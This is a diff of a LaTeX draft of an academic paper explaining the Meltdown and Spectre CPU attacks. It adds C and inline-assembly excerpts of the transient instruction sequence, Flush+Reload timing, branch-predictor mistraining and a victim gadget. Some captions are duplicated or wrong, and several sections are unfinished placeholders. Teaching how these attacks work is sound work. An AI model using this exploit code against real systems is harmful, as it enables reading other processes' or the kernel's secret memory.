@@ -18,15 +18,45 @@
 \usepackage{url}
 \usepackage{amsmath}
 \usepackage{amsfonts}
+\usepackage{listings}
 %\usepackage{dtklogos}
 %\usepackage{blindtext}
 \usepackage{tikz}
+\usepackage[T1]{fontenc}
 %\usepackage{longtable}
 %\usepackage{supertabular}
-%\usepackage{verbatim}
-%\usepackage{color}
-%\usepackage{moreverb}       % z.B. \listinginput
-%\usepackage{float}
+\usepackage{verbatim}
+\usepackage{color}
+\usepackage{moreverb}       % z.B. \listinginput
+\usepackage{float}
+
+\definecolor{codegreen}{rgb}{0,0.6,0}
+\definecolor{codegray}{rgb}{0.5,0.5,0.5}
+\definecolor{codepurple}{rgb}{0.58,0,0.82}
+\definecolor{backcolour}{rgb}{1.0,1.0,1.0}
+ 
+\lstdefinestyle{mystyle}{
+    backgroundcolor=\color{backcolour},   
+    commentstyle=\color{codegreen},
+    keywordstyle=\color{magenta},
+    numberstyle=\tiny\color{codegray},
+    stringstyle=\color{codepurple},
+    basicstyle=\footnotesize,
+    breakatwhitespace=false,         
+    breaklines=true,                 
+    captionpos=b,                    
+    keepspaces=true,                 
+    numbers=left,                    
+    numbersep=5pt,                  
+    showspaces=false,                
+    showstringspaces=false,
+    showtabs=false,                  
+    tabsize=2,
+    frame={shadowbox},
+}
+ 
+\lstset{style=mystyle}
+ 
 
 \newcommand{\HRule}{\rule{\linewidth}{0.5mm}}
 
@@ -276,16 +306,16 @@ As explained above Meltdown and Spectre try to manipulate the cache with the hel
 When a CPU detects illegal memory access within such instructions a fatal error is raised and the program of the attacker
 is terminated. Therefore Meltdown has two concepts of avoiding crashes: \textit{exception handling} and \textit{exception suppression}.
 
-Exception handling is the process of catching raised errors. Meltdown uses two techniques to catch errors: defining signal handlers
-which are executed in case of a segmentation fault or by creating child processes which are rolled back on error.
-The latter is just applicable on Intel TSX processors where transient instructions can be grouped and reversed as a whole after failing.
+Exception handling is the process of catching raised errors. Meltdown uses signal handlers to catch errors
+which are executed in case of a segmentation fault.
 
 Exception suppression is the process of preventing that an error is raised. This can be done by putting the illegal memory access
 within a branch condition. The goal is to trick the branch predictor so that the condition is predicted incorrectly and the following
 instructions are speculatively executed.
 Then errors do not terminate the attacker's process instead the CPU silently vanishes their results
  but still leaves exploitable traces in the cache.
-Meltdown misuses the race condition of the CPU between raising the error and cleaning it's microarchitectural state. 
+Meltdown misuses the race condition of the CPU between raising the error and cleaning it's microarchitectural state. On Intel TSX processors Meltdown realizes exception suppression by grouping transient instructions which can be
+ reversed as a whole after failing.
 
 The Spectre attack does not need to catch segmentation faults because it just tricks the branch predictor to access secret data. 
 Hence the exploit is only based on exception suppression.
@@ -325,24 +355,82 @@ The implementations will highlight how the explained techniques work in detail.
 \section{Meltdown Implementation}
 \label{ch:intro:motivation}
 
-This section deals with the implementation of Meltdown\footnote{https://github.com/IAIK/meltdown/tree/master/libkdump}.
-Every building block of the exploit is examined gradually.
+This section deals with the implementation of Meltdown\footnote{https://github.com/IAIK/meltdown/tree/master/libkdump} applying
+Flush+Reload to build a covert channel. Just the core functionality of the implementation is focused and
+the building blocks of the exploit are examined gradually.
 
-
-\subsection{Transient Assembler Instructions}
+\subsection{Transient Instruction Sequence}
 \label{ch:intro:motivation:A}
 
-XXXXXXXXXXXXXXXXXXXX
+\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
+  #define meltdown\
+  asm volatile("1:\n"\
+               "movq (%%rsi), %%rsi\n"\
+               "movzx (%%rcx), %%rax\n"\
+               "shl $12, %%rax\n"\
+               "jz 1b\n"\
+               "movq (%%rbx,%%rax,1), %%rbx\n"\
+               :\
+               : "c"(phys), "b"(mem), "S"(0)\
+               : "rax");
+\end{lstlisting}
 
-\subsection{Exception Suppression}
+\subsection{Dealing with Exceptions}
 \label{ch:intro:motivation:A}
 
-XXXXXXXXXXXXXXXXXXXX
+\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
+static void unblock_signal(int signum __attribute__((__unused__))) {
+    sigset_t sigs;
+    sigemptyset(&sigs);
+    sigaddset(&sigs, signum);
+    sigprocmask(SIG_UNBLOCK, &sigs, NULL);
+}
+\end{lstlisting}
 
-\subsection{Detecting Cached Bytes}
+\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
+static int __attribute__((always_inline)) flush_reload(void *ptr) {
+    uint64_t start = 0, end = 0;
+  
+    start = rdtsc();
+    maccess(ptr);
+    end = rdtsc();
+  
+    flush(ptr);
+  
+    if (end - start < config.cache_miss_threshold) {
+      return 1;
+    }
+    return 0;
+}
+\end{lstlisting}
+
+\subsection{Covert Channel Creation}
 \label{ch:intro:motivation:A}
 
-XXXXXXXXXXXXXXXXXXXX
+\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
+int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
+    size_t retries = config.retries + 1;
+    uint64_t start = 0, end = 0;
+  
+    while (retries--) {
+      if (!setjmp(buf)) {
+        MELTDOWN;
+      }
+  
+      int i;
+      for (i = 0; i < 256; i++) {
+        if (flush_reload(mem + i * 4096)) {
+          if (i >= 1) {
+            return i;
+          }
+        }
+        sched_yield();
+      }
+      sched_yield();
+    }
+    return 0;
+}
+\end{lstlisting}
 
 \subsection{Retrieving Secret Bytes}
 \label{ch:intro:motivation:A}
@@ -352,22 +440,87 @@ XXXXXXXXXXXXXXXXXXXX
 \section{Spectre Implementation}
 \label{ch:intro:motivation}
 
-XXXXXXXXXXXXXXXXXXXX
+This chapter examines an example C++ implementation of Spectre which also applies Flush+Reload and some advanced techniques
+to manipulate the branch predictor.
 
-\subsection{Detecting Cached Bytes}
+\subsection{Covert Channel}
+\label{ch:intro:motivation:A}
+ 
+This section illustrates how Spectre creates a covert channel with Flush+Reload. 
+In listing ~\ref{lst:victim} the flush part of the Flush+Reload attack is shown. It utilizes the intrinsic instruction 
+\texttt{\_mm\_clflush} ~\cite{intelintrinsics} to clean the probe array from the cache. This part resets the cache state
+so that time measurements can be conducted afterwards. If Spectre is implemented in high level languages like JavaScript it
+might be the case that \texttt{\_mm\_clflush} is not available as a function call. Then other techniques like Evict+Reload have
+to be applied.
+
+\begin{lstlisting}[language=C, caption=Spectre: Flush, label={lst:flush}]
+for (i = 0; i < 256; i++)
+    _mm_clflush(&array2[i * 512]); /* clflush */
+}
+\end{lstlisting}
+
+The next step is the reload phase where all elements of the probe array are tested for being cached. 
+Listing ~\ref{lst:reload} contains the instructions of this phase. Line 3 maps the index value \texttt{i} to pseudorandom numbers
+ so that the access of the elements is scattered and not conducted linearly. 
+ This is necessary because neighboring pages might be cached if 
+accessed linearly which would lead to invalid measurement results. Line 6 contains the actual reload instruction which is wrapped 
+by time measurements.
+To measure the access time precisely the intrinsic instruction \texttt{\_\_rdtscp} ~\cite{intelintrinsics} is used which
+copies the CPU's time-stamp counter. High precision timers are crucial for the attack. For this reason browsers like 
+Google Chrome reduced the precision of the \texttt{performance.now()} function to mitigate Spectre attacks ~\cite{chromeSpectreMeltdown}.
+To distinguish a cached memory location from an uncached one it is necessary to compute the value \texttt{CACHE\_HIT\_THRESHOLD}.
+This value has to be adapted for the CPU and can be calculated by taking the average time of many cache hits.
+If the measured access time is smaller or equal to the threshold the related index of the element is considered as a potential result.
+
+\begin{lstlisting}[language=C, caption=Spectre: Reload, label={lst:reload}]
+for (i = 0; i < 256; i++)
+{
+    mix_i = ((i * 167) + 13) & 255;
+    addr = &array2[mix_i * 512];
+    time1 = __rdtscp(&junk);
+    junk = *addr;
+    time2 = __rdtscp(&junk) - time1;
+    if (time2 <= CACHE_HIT_THRESHOLD &&
+        mix_i != array1[tries % array1_size])
+        results[mix_i]++; /* cache hit -> score +1 for this value */
+}
+\end{lstlisting}
+
+\subsection{Tricking the Branch Predictor}
 \label{ch:intro:motivation:A}
 
-XXXXXXXXXXXXXXXXXXXX
+Tricking the branch predictor is the core of the Spectre attack. Listing ~\ref{lst:twiddling} 
 
-\subsection{Mistraining the Branch Predictor}
-\label{ch:intro:motivation:A}
+\begin{lstlisting}[language=C, caption=Spectre: Branch Predictor Tricking, label={lst:twiddling}]
+/* Bit twiddling to set x=training_x if j % 6 != 0 * or malicious_x if j % 6 == 0 */
+/* Avoid jumps in case those tip off the branch predictor */
+/* Set x=FFF.FF0000 if j%6==0, else x=0 */
+x = ((j % 6) - 1) & ~0xFFFF;
+/* Set x=-1 if j&6=0, else x=0 */
+x = (x | (x >> 16));
+x = training_x ^ (x & (malicious_x ^ training_x));
+    
+/* Call the victim! */
+victim_function(x);
+\end{lstlisting}
 
-XXXXXXXXXXXXXXXXXXXX
+Listing ~\ref{lst:victim} shows an example victim function. The goal is to trick the branch predictor so that the if condition is 
+assumed to be true even if the value \texttt{x} is out of the array bounds. The value \texttt{512} indicates the memory page size of the
+attacked program which is multiplied by the secret value of \texttt{array1}. So an element of \texttt{array2}, the probe array, is loaded
+and thus cached if the instruction is executed.
 
-\subsection{Retrieving Secret Bytes}
-\label{ch:intro:motivation:A}
+\begin{lstlisting}[language=C, caption=Spectre: Example Victim Gadget, label={lst:victim}]
+void victim_function(size_t x)
+{
+    if (x < array1_size)
+    {
+        temp &= array2[array1[x] * 512];
+    }
+}
+\end{lstlisting}
 
-XXXXXXXXXXXXXXXXXXXX
+\begin{lstlisting}[language=C, caption=Transient Instruction Sequence of Meltdown]
+\end{lstlisting}
 
 %%%
 \chapter{Countermeasures}
@@ -397,6 +550,8 @@ XXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXX
 XXXXXXXXXXXXXXXXXXXX
+
+\lstlistoflistings
 
 \bibliography{literature}
 \bibliographystyle{alpha}
